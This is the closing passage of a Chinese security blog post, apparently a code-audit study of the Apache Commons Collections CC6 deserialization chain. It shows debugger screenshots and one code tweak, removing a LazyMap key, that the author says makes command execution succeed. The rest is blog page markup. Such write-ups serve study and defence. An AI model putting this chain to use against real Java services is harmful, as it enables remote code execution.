+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282323612.png" alt="image-20220328232312542"></p>
+<p>然后下一点也和urldns类似</p>
+<p>我们可以调试下，打个断点</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282327907.png" alt="image-20220328232751780"></p>
+<p>我们一路跟进去</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282328074.png" alt="image-20220328232821970"></p>
+<p>这边调hashCode</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282335151.png" alt="image-20220328233511041"></p>
+<p>然后到getValue,注意key的值</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282335687.png" alt="image-20220328233555627"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282337238.png" alt="image-20220328233708125"></p>
+<p>我们这边可以看到他会把key放进去，导致我们自己的key没了，所有我们需要把他给的key删了</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282337861.png" alt="image-20220328233744765"></p>
+<p>所有我们添加代码</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lazyMap.<span class="built_in">remove</span>(<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这个时候我们命令执行就成功了</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282339270.png" alt="image-20220328233921085"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># java代码审计</a>
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/27/waf%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E7%9A%84%E7%BB%95%E8%BF%87/" rel="prev" title="waf原理以及绕过笔记">
+      <i class="fa fa-chevron-left"></i> waf原理以及绕过笔记
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CC1"><span class="nav-text">CC1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%EF%BC%9A"><span class="nav-text">环境搭建：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0"><span class="nav-text">分析复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ChainedTransformer-transformer"><span class="nav-text">ChainedTransformer.transformer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LazyMap-get"><span class="nav-text">LazyMap.get</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AnnotationInvocationHandler-invoke"><span class="nav-text">AnnotationInvocationHandler.invoke</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CC6"><span class="nav-text">CC6</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-1"><span class="nav-text">分析复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#TiedMapEntry-hashCode"><span class="nav-text">TiedMapEntry.hashCode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hashmap-readObject"><span class="nav-text">hashmap.readObject</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">apsry</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">apsry</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
